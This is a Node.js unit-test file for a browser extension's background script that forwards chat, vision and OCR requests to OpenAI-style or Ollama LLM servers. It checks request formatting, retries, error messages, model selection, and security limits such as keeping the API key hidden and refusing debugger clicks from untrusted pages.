const { test } = require("node:test");
const assert = require("node:assert");
const { jsonResponse, htmlResponse, streamResponse, loadBackground } = require("./helpers");

const IMG = "data:image/png;base64,AAA";

function baseConfig(overrides = {}) {
    return {
        chatUrl: "http://host/api/chat/completions",
        apiKey: "sk-test",
        model: "default-model",
        apiFormat: "openai",
        ocrModel: "",
        ...overrides
    };
}

test("FETCH_LLM builds an OpenAI body and extracts the reply", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/api/chat/completions");
            assert.equal(call.opts.method, "POST");
            assert.equal(call.opts.headers["Authorization"], "Bearer sk-test");
            assert.equal(call.body.model, "default-model");
            assert.equal(call.body.stream, false);
            assert.equal(call.body.params.think, false, "openai: think goes in params, not top-level");
            assert.equal(call.body.think, undefined, "not top-level (OpenWebUI drops it there)");
            assert.deepEqual(call.body.messages, [{ role: "user", content: "hi" }]);
            return jsonResponse({ choices: [{ message: { content: "yo" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], think: false }
    });
    assert.deepEqual(res, { data: "yo", model: "default-model" });
});

test("FETCH_LLM think:false goes in params (openai) / top-level (ollama)", async () => {
    let sawO;
    const bgO = loadBackground({ config: baseConfig(), onFetch: (c) => { sawO = c.body; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); } });
    await bgO.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], think: false } });
    assert.equal(sawO.params.think, false, "openai: in params (OpenWebUI's channel)");
    assert.equal(sawO.think, undefined, "openai: not top-level");

    let sawL;
    const bgL = loadBackground({ config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }), onFetch: (c) => { sawL = c.body; return jsonResponse({ message: { content: "ok" } }); } });
    await bgL.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], think: false } });
    assert.equal(sawL.think, false, "ollama: native top-level");
});

test("FETCH_LLM surfaces reasoning — reasoning_content (openai) and message.thinking (ollama)", async () => {
    const bgO = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "42", reasoning_content: "6 times 7" } }] })
    });
    const rO = await bgO.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "6*7?" }] } });
    assert.equal(rO.data, "42");
    assert.equal(rO.reasoning, "6 times 7");

    const bgL = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => jsonResponse({ message: { content: "42", thinking: "6 times 7" } })
    });
    const rL = await bgL.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "6*7?" }] } });
    assert.equal(rL.reasoning, "6 times 7");
});

test("FETCH_LLM: choices present but null content → an empty reply, NOT a format error", async () => {
    // A MiniMax content-filtered reply: valid openai `choices`, but the message content
    // was blanked (output_sensitive). Must degrade to "" so a vision sub-call reads NONE
    // and the run continues — not crash with a misleading "check the API format" error.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ id: "x", object: "chat.completion", choices: [{ message: { role: "assistant", content: null } }], output_sensitive: true, base_resp: { status_code: 0 } })
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.equal(res.data, "", "empty/filtered message → empty reply");
    assert.ok(!res.error, "not surfaced as an error");
});

test("FETCH_LLM: a response with NO choices container IS a clear format-mismatch error", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ detail: "not found", nonsense: true })   // no `choices` → genuine mismatch
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.match(res.error, /did not match the "openai" format/);
});

test("FETCH_LLM: a 429 (rate limit) is backed off and retried, then succeeds", async () => {
    let calls = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => {
            calls++;
            // Free tiers advise a delay in the body ("try again in Xs"); 0s → a ~250ms backoff here.
            if (calls === 1) return jsonResponse({ error: { message: "Rate limit reached. Please try again in 0s." } }, 429);
            return jsonResponse({ choices: [{ message: { content: "recovered" } }] });
        },
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.equal(calls, 2, "the 429 was retried once");
    assert.equal(res.data, "recovered", "the retry's reply is returned");
});

test("FETCH_LLM: repeated 429s give up after the retry cap with a clear error (never hangs)", async () => {
    let calls = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { calls++; return jsonResponse({ error: { message: "Rate limit. try again in 0s." } }, 429); },
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.ok(calls >= 5, `bounded retries then surfaces the error (was ${calls} attempts)`);
    assert.match(res.error, /HTTP 429/, "the persistent rate limit is surfaced, not swallowed");
});

test("FETCH_LLM: a transient NETWORK failure is retried, so an ongoing run RECOVERS when the box returns", async () => {
    // The box blips mid-run (2 failed calls), then comes back. The retry rides it out — the run recovers
    // instead of hard-failing. (Backoff is 0ms under test via __ML_NET_RETRY_WAIT_MS.)
    let calls = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { calls++; if (calls <= 2) throw new TypeError("Failed to fetch"); return jsonResponse({ choices: [{ message: { content: "recovered" } }] }); },
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "m" } });
    assert.equal(calls, 3, "the two network failures were retried, not fatal");
    assert.equal(res.data, "recovered", "the run recovered the moment the backend answered again");
});

test("FETCH_LLM: a network failure that NEVER recovers gives up after the retry cap with the offline error", async () => {
    let calls = 0;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { calls++; throw new TypeError("Failed to fetch"); },
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "m" } });
    assert.ok(calls >= 5, `bounded retries then surfaces the error (was ${calls} attempts)`);
    assert.match(res.error, /Couldn't reach the server/, "gives up with the actionable offline error");
});

test("FETCH_LLM: an unreachable server → an actionable error, not a bare 'Failed to fetch'", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => { throw new TypeError("Failed to fetch"); }   // server down / refused / DNS
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.match(res.error, /Couldn't reach the server/, "names the reach failure");
    assert.match(res.error, /http:\/\/host\/api\/chat\/completions/, "includes the URL that failed");
    assert.match(res.error, /settings/i, "points the user at settings");
});

test("FETCH_LLM: an empty Server URL is caught before any fetch, with an actionable message", async () => {
    let fetched = false;
    const bg = loadBackground({
        config: baseConfig({ chatUrl: "" }),
        onFetch: () => { fetched = true; return jsonResponse({ choices: [{ message: { content: "hi" } }] }); }
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.match(res.error, /No server URL configured/);
    assert.equal(fetched, false, "no fetch is attempted with no URL");
});

test("FETCH_LLM omits the reasoning key when the model produced none", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }] })
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.ok(!("reasoning" in res), "no reasoning key on a plain reply");
});

test("FETCH_LLM surfaces token usage — OpenWebUI `usage` block and Ollama-native root counts", async () => {
    // OpenWebUI nests a usage block (OpenAI naming).
    const bgO = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "42" } }], usage: { prompt_tokens: 18, completion_tokens: 70, total_tokens: 88 } })
    });
    const rO = await bgO.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.deepEqual(rO.usage, { promptTokens: 18, completionTokens: 70, totalTokens: 88 });

    // Ollama-native puts prompt_eval_count/eval_count at the response root (no total).
    const bgL = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: () => jsonResponse({ message: { content: "42" }, prompt_eval_count: 20, eval_count: 5 })
    });
    const rL = await bgL.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.deepEqual(rL.usage, { promptTokens: 20, completionTokens: 5, totalTokens: 25 }, "total derived when absent");
});

test("FETCH_LLM raw returns reasoning_content (the agent path) — a tool-call turn with empty content", async () => {
    // The observed case: content:"" + reasoning_content has the thinking + a tool_call. The raw path
    // (agent loop) must surface `reasoning` alongside tool_calls, not drop it like it used to.
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "", reasoning_content: "The user wants the red guy.", tool_calls: [{ id: "c1", type: "function", function: { name: "exec", arguments: "{}" } }] } }] }),
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }], raw: true } });
    assert.equal(res.data.reasoning, "The user wants the red guy.", "reasoning_content surfaces on the raw path");
    assert.equal(res.data.content, "", "content is the (empty) prose");
    assert.equal(res.data.tool_calls.length, 1, "the tool call still comes through");
});

test("FETCH_LLM usage is null when the server reports no counts (never a fake 0)", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => jsonResponse({ choices: [{ message: { content: "hi" } }] })
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "q" }] } });
    assert.equal(res.usage, null);
});

test("num_ctx: a smaller cap becomes the RESIDENT value when the model is already loaded bigger (no reload, no balloon)", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            // /api/ps says gemma4:31b is loaded with a 262144 window.
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [{ model: "gemma4:31b", context_length: 262144, size_vram: 1 }] });
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    // A delegated vision call caps num_ctx at 8192 — but the resident 262144 fits, so we
    // send the RESIDENT value (matches the running instance → no reload). NOT omitted:
    // an omitted num_ctx would make a stale-residency reload auto-size to the default.
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "gemma4:31b", numCtx: 8192 } });
    assert.equal(chatBody.params.num_ctx, 262144, "sends the resident window, so it matches the running model (no reload) yet still bounds a mistaken fresh load");
});

test("num_ctx: the cap IS applied when the model is not resident (a fresh load stays bounded)", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [] });   // nothing loaded
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "qwen2.5vl:7b", numCtx: 8192 } });
    assert.equal(chatBody.params.num_ctx, 8192, "cap applied — a fresh load must stay bounded");
});

test("num_ctx: the cap is kept when the resident window is SMALLER than requested (needs the space)", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [{ model: "m", context_length: 2048, size_vram: 1 }] });
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], model: "m", numCtx: 8192 } });
    assert.equal(chatBody.params.num_ctx, 8192, "resident 2048 < 8192 → keep the override");
});

test("num_ctx: ml.read (ocr) applies the small ocrNumCtx default — no 256K balloon on a fresh load", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig({ ocrModel: "vision:7b", ocrNumCtx: 8192 }),
        onFetch: (call) => {
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [] });   // OCR model not loaded
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    // ml.read sends ocr:true with NO explicit numCtx → prepareRequest fills config.ocrNumCtx.
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "read", images: ["data:image/png;base64,x"] }], ocr: true } });
    assert.equal(chatBody.params.num_ctx, 8192, "ocr default → small ocrNumCtx, not the model's full window");
});

test("num_ctx: ml.read({ numCtx }) overrides the ocrNumCtx default", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig({ ocrModel: "vision:7b", ocrNumCtx: 8192 }),
        onFetch: (call) => {
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [] });
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "read" }], ocr: true, numCtx: 16384 } });
    assert.equal(chatBody.params.num_ctx, 16384, "explicit per-call numCtx wins over the ocrNumCtx default");
});

test("num_ctx: ml.read reuses an OCR model already resident at a bigger window (no reload)", async () => {
    let chatBody = null;
    const bg = loadBackground({
        config: baseConfig({ ocrModel: "vision:7b", ocrNumCtx: 8192 }),
        onFetch: (call) => {
            if (call.url.includes("/api/ps")) return jsonResponse({ models: [{ model: "vision:7b", context_length: 131072, size_vram: 1 }] });
            chatBody = call.body;
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        },
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "read" }], ocr: true } });
    assert.equal(chatBody.params.num_ctx, 131072, "resident 131072 ≥ 8192 → reuse the running instance, no reload");
});

test("FETCH_LLM omits think unless it is a boolean", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(!("think" in call.body));
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], think: null }
    });
    assert.equal(res.data, "ok");
});

test("FETCH_LLM maxTokens becomes max_tokens (openai) and is omitted otherwise", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); }
    });

    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], maxTokens: 512 } });
    assert.equal(sawBody.max_tokens, 512);

    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }] } });
    assert.ok(!("max_tokens" in sawBody), "no cap → no max_tokens field");

    // Non-positive / non-integer caps are ignored (no runaway guard, but no bad body).
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], maxTokens: 0 } });
    assert.ok(!("max_tokens" in sawBody));
});

test("FETCH_LLM maxTokens becomes options.num_predict on the ollama format", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });

    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], maxTokens: 256 } });
    assert.equal(sawBody.options.num_predict, 256);
});

test("FETCH_LLM extend:'utility' resolves the utility model + num_ctx/num_gpu (ollama)", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat", model: "big:70b", utilityModel: "small:0.8b", utilityNumCtx: 2048, utilityForceCpu: true }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });
    const res = await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility" } });
    assert.equal(sawBody.model, "small:0.8b", "utility model");
    assert.equal(sawBody.options.num_ctx, 2048);
    assert.equal(sawBody.options.num_gpu, 0, "force CPU → num_gpu 0");
    assert.equal(res.model, "small:0.8b", "response reports the resolved (utility) model for the sidebar");
});

test("FETCH_LLM extend:'utility' falls back to the default model when unset", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat", model: "big:70b", utilityModel: "" }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility" } });
    assert.equal(sawBody.model, "big:70b");
});

test("FETCH_LLM explicit model + numCtx override the extend profile ({...profile, ...explicit})", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat", utilityModel: "small:0.8b", utilityNumCtx: 2048 }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ message: { content: "ok" } }); }
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility", model: "mid:14b", numCtx: 8192 } });
    assert.equal(sawBody.model, "mid:14b", "explicit model wins");
    assert.equal(sawBody.options.num_ctx, 8192, "explicit numCtx wins");
});

test("FETCH_LLM sends num_ctx/num_gpu in the params object on the openai format (OpenWebUI's channel)", async () => {
    let sawBody;
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "openai", utilityModel: "small", utilityNumCtx: 2048, utilityForceCpu: true }),
        onFetch: (call) => { sawBody = call.body; return jsonResponse({ choices: [{ message: { content: "ok" } }] }); }
    });
    await bg.send({ type: "FETCH_LLM", payload: { messages: [{ role: "user", content: "hi" }], extend: "utility" } });
    assert.equal(sawBody.model, "small", "utility model applies");
    assert.equal(sawBody.params.num_ctx, 2048, "in params (OpenWebUI maps params → ollama options)");
    assert.equal(sawBody.params.num_gpu, 0);
    assert.equal(sawBody.options, undefined, "not a direct options object (OpenWebUI overwrites it)");
});

test("GET_CONFIG exposes the utility-model fields", async () => {
    const bg = loadBackground({
        config: baseConfig({ utilityModel: "small:0.8b", utilityNumCtx: 2048, utilityForceCpu: true }),
        onFetch: () => jsonResponse({})
    });
    const resp = await bg.send({ type: "GET_CONFIG", payload: {} });
    assert.equal(resp.data.utilityModel, "small:0.8b");
    assert.equal(resp.data.utilityNumCtx, 2048);
    assert.equal(resp.data.utilityForceCpu, true);
    assert.equal(resp.data.autoApproveSameOriginAuth, false, "the same-origin-auth opt-in is exposed (default off)");
});

test("FETCH_URL: the Advanced same-origin-auth opt-in frees a SAME-ORIGIN credentialed fetch — cross-origin still always asks", async () => {
    const page = "https://site.example/dashboard";
    let sentCreds = null;
    const bg = loadBackground({ config: baseConfig({ autoApproveSameOriginAuth: true }), onFetch: (call) => { sentCreds = call.opts?.credentials; return fetchResponse('{"ok":1}', { contentType: "application/json", url: call.url }); } });
    const send = (payload) => bg.send({ type: "FETCH_URL", payload }, { tab: { id: 9, url: page }, url: page });

    const same = await send({ url: "https://site.example/me.json", credentials: true });
    assert.ok(same.data && !same.error, "same-origin credentialed fetch is FREE (no grant) when the opt-in is ON");
    assert.equal(sentCreds, "include", "…and it spent the user's cookies");

    const cross = await send({ url: "https://other.example/me.json", credentials: true });
    assert.ok(cross.error && /wasn't approved/i.test(cross.error), "cross-origin credentialed still ALWAYS asks, even with the opt-in");
});

// ---- GET_INVOCATION (how the user opens the HUD) ----
// The shortcut is user-rebindable, so the answer must come from chrome.commands at call
// time. Hardcoding "Alt+Space" anywhere would eventually tell a user to press a dead key.

test("GET_INVOCATION reports the LIVE shortcut and flags it as the default", async () => {
    const bg = loadBackground({ config: baseConfig(), commandShortcut: "Alt+Space" });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "Alt+Space");
    assert.equal(resp.data.defaultShortcut, "Alt+Space");
    assert.equal(resp.data.isDefault, true);
    assert.equal(resp.data.contextMenu, false);      // not shipped → never claimed
});

test("GET_INVOCATION flags a user-CUSTOMISED shortcut", async () => {
    const bg = loadBackground({ config: baseConfig(), commandShortcut: "Ctrl+Shift+K" });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "Ctrl+Shift+K");
    assert.equal(resp.data.isDefault, false, "a rebound key must not be reported as the default");
    assert.equal(resp.data.defaultShortcut, "Alt+Space", "the original is still reported, for context");
});

test("GET_INVOCATION reports an UNBOUND shortcut rather than pretending the default works", async () => {
    // chrome.commands returns "" when the user cleared the binding or it collided with
    // another extension — the HUD then has no keyboard route at all.
    const bg = loadBackground({ config: baseConfig(), commandShortcut: "" });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "");
    assert.equal(resp.data.isDefault, false);
});

test("GET_INVOCATION survives chrome.commands being unavailable", async () => {
    const bg = loadBackground({ config: baseConfig(), commandShortcut: null });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.shortcut, "");
    assert.equal(resp.data.defaultShortcut, "Alt+Space", "the manifest default still answers");
});

test("GET_INVOCATION claims the context menu only once the permission is declared", async () => {
    // The right-click entry isn't built yet; this line turns itself on when it lands, so the
    // model never advertises an affordance the user doesn't have.
    const bg = loadBackground({ config: baseConfig(), manifestPermissions: ["storage", "contextMenus"] });
    const resp = await bg.send({ type: "GET_INVOCATION", payload: {} });
    assert.equal(resp.data.contextMenu, true);
});

test("FETCH_LLM honors a per-call model override", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.body.model, "override-model");
            return jsonResponse({ choices: [{ message: { content: "ok" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }], model: "override-model" }
    });
    assert.equal(res.data, "ok");
});

test("FETCH_LLM ocr flag resolves the dedicated ocrModel", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "qwen3:235b", ocrModel: "qwen2.5vl" }),
        onFetch: (call) => {
            if (call.url.endsWith("/api/show")) {
                return jsonResponse({ capabilities: ["completion", "vision"] });
            }
            assert.equal(call.body.model, "qwen2.5vl"); // not the reasoning model
            return jsonResponse({ choices: [{ message: { content: "hello world" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "transcribe", images: [IMG] }], ocr: true }
    });
    assert.equal(res.data, "hello world");
});

test("FETCH_LLM ocr flag errors clearly when no OCR model is set", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "", ocrModel: "" }),
        onFetch: () => assert.fail("no request should be sent")
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "x", images: [IMG] }], ocr: true }
    });
    assert.match(res.error, /No OCR model configured/);
});

test("FETCH_LLM errors clearly when no model is configured", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "" }),
        onFetch: () => assert.fail("no request should be sent")
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "hi" }] }
    });
    assert.match(res.error, /No model configured/);
    assert.equal(bg.calls.length, 0);
});

test("FETCH_LLM openai format attaches images as image_url content parts", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url === "http://host/ollama/api/show") {
                return jsonResponse({ capabilities: ["completion", "vision"] });
            }
            assert.deepEqual(call.body.messages, [{
                role: "user",
                content: [
                    { type: "text", text: "look" },
                    { type: "image_url", image_url: { url: IMG } }
                ]
            }]);
            return jsonResponse({ choices: [{ message: { content: "seen" } }] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.equal(res.data, "seen");
});

test("FETCH_LLM ollama format attaches bare-base64 images and reads message.content", async () => {
    const bg = loadBackground({
        config: baseConfig({ apiFormat: "ollama", chatUrl: "http://host/ollama/api/chat" }),
        onFetch: (call) => {
            if (call.url === "http://host/ollama/api/show") {
                return jsonResponse({ capabilities: ["completion", "vision"] });
            }
            assert.deepEqual(call.body.messages, [
                { role: "user", content: "look", images: ["AAA"] }
            ]);
            return jsonResponse({ message: { content: "seen" } });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.equal(res.data, "seen");
});

test("FETCH_LLM rejects images for a model without vision, before any chat request", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.equal(call.url, "http://host/ollama/api/show");
            return jsonResponse({ capabilities: ["completion", "thinking"] });
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.match(res.error, /does not support image input/);
    assert.equal(bg.calls.length, 1); // only the capability probe
});

test("FETCH_LLM annotates server errors when vision support is unknown", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            if (call.url.endsWith("/api/show")) return htmlResponse(405);
            return jsonResponse({ detail: "boom" }, 500);
        }
    });

    const res = await bg.send({
        type: "FETCH_LLM",
        payload: { messages: [{ role: "user", content: "look", images: [IMG] }] }
    });
    assert.match(res.error, /HTTP 500/);
    assert.match(res.error, /may not support image input/);
});

test("MODEL_CAPS returns a model's capability list from /api/show", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: (call) => {
            assert.ok(call.url.endsWith("/api/show"));
            assert.equal(call.body.model, "qwen3:32b");
            return jsonResponse({ capabilities: ["completion", "tools", "thinking"] });
        }
    });

    const res = await bg.send({ type: "MODEL_CAPS", payload: { model: "qwen3:32b" } });
    assert.deepEqual(res.data, ["completion", "tools", "thinking"]);
});

test("MODEL_CAPS returns null when capabilities can't be determined", async () => {
    const bg = loadBackground({
        config: baseConfig(),
        onFetch: () => htmlResponse(404)   // no /api/show on this backend
    });

    const res = await bg.send({ type: "MODEL_CAPS", payload: { model: "gpt-4o" } });
    assert.equal(res.data, null);
});

test("GET_CONFIG returns the model/ocrModel/apiFormat and withholds the URL and key", async () => {
    const bg = loadBackground({
        config: baseConfig({ model: "qwen3:235b", ocrModel: "qwen2.5vl", apiFormat: "ollama" })
    });

    const res = await bg.send({ type: "GET_CONFIG", payload: {} });
    assert.deepEqual(res.data, {
        model: "qwen3:235b", ocrModel: "qwen2.5vl", ocrNumCtx: 8192, apiFormat: "ollama", defaultModelVision: "",
        utilityModel: "", utilityNumCtx: 4096, utilityForceCpu: false, autoApproveReadonly: true, autoApprovePython: true,
        autoApproveSameOriginAuth: false, autoApproveSelfSource: true,
        pierceClosedShadow: true, cdp: false,
        groundingEnabled: false, groundingModel: "", groundingRange: 1000, debugMode: "off",
        // Computed per-origin: no sender.tab in this harness call → not on the whitelist → false. The raw
        // pageApprovalDomains list is deliberately NOT exposed (only this boolean for the caller's origin).
        pageApprovalAllowed: false,
    });
    // The page must never see the server URL, API key, or the raw approval-domain list (security invariants).
    assert.ok(!("chatUrl" in res.data) && !("apiKey" in res.data) && !("pageApprovalDomains" in res.data), Object.keys(res.data).join());
});

test("CDP_CLICK dispatches a trusted press+release via the debugger; the attachment is REUSED across clicks", async () => {
    const bg = loadBackground({ config: baseConfig({ cdp: true }) });
    // A trusted surface (no sender.tab — e.g. the approval UI) passes the inspected tabId in the payload.
    const res = await bg.send({ type: "CDP_CLICK", payload: { x: 120, y: 340, tabId: 9 } }, {});
    assert.deepEqual(res, { ok: true });
    // attach → press → release. Detach is now lifecycle-driven (run-end / tab-close / idle), NOT per-click —
    // attaching/detaching per call is the dominant per-CDP-op cost we're eliminating.
    assert.deepEqual(bg.debuggerCalls.map(c => c[0]), ["attach", "sendCommand", "sendCommand"], "attach → press → release (no per-click detach)");
    assert.deepEqual(bg.debuggerCalls[0][1], { tabId: 9 });
    assert.equal(bg.debuggerCalls[0][2], "1.3");
    const [, , pressMethod, pressParams] = bg.debuggerCalls[1];
    const releaseParams = bg.debuggerCalls[2][3];
    assert.equal(pressMethod, "Input.dispatchMouseEvent");
    assert.equal(pressParams.type, "mousePressed");
    assert.equal(releaseParams.type, "mouseReleased");
    assert.equal(pressParams.x, 120); assert.equal(pressParams.y, 340); assert.equal(pressParams.button, "left");
    // A SECOND click on the same tab REUSES the live attachment — no second attach (the whole point of persisting).
    await bg.send({ type: "CDP_CLICK", payload: { x: 5, y: 6, tabId: 9 } }, {});
    assert.equal(bg.debuggerCalls.filter(c => c[0] === "attach").length, 1, "attached ONCE, reused for the second click");
    assert.equal(bg.debuggerCalls.filter(c => c[0] === "sendCommand").length, 4, "two clicks = two press+release pairs on the one attachment");
});

test("CDP_CLICK is refused when the cdp flag is off (never attaches)", async () => {
    const bg = loadBackground({ config: baseConfig({ cdp: false }) });
    const res = await bg.send({ type: "CDP_CLICK", payload: { x: 1, y: 2, tabId: 9 } }, {});
    assert.match(res.error, /off — enable/i);
    assert.equal(bg.debuggerCalls.length, 0, "never attached the debugger");
});

test("CDP_CLICK from an UNTRUSTED page is refused (choke-point, no attach)", async () => {
    const bg = loadBackground({ config: baseConfig({ cdp: true }) });
    // sender.tab set + host not on pageApprovalDomains → untrusted → a page can't self-initiate a CDP click.
    const res = await bg.send({ type: "CDP_CLICK", payload: { x: 1, y: 2 } }, { tab: { id: 4, url: "https://evil.example/" } });
    assert.match(res.error, /can't be initiated by this page/i);
    assert.equal(bg.debuggerCalls.length, 0);
});

test("CDP_CLICK reports the missing debugger permission (never attaches)", async () => {
    const bg = loadBackground({ config: baseConfig({ cdp: true }), debuggerPermission: false });
    const res = await bg.send({ type: "CDP_CLICK", payload: { x: 1, y: 2, tabId: 9 } }, {});
    assert.ok(res.needsPermission, "flags that the permission is needed");
    assert.match(res.error, /`debugger` permission isn't granted|permission is missing/i);
    assert.equal(bg.debuggerCalls.length, 0, "never attached without the permission");
});

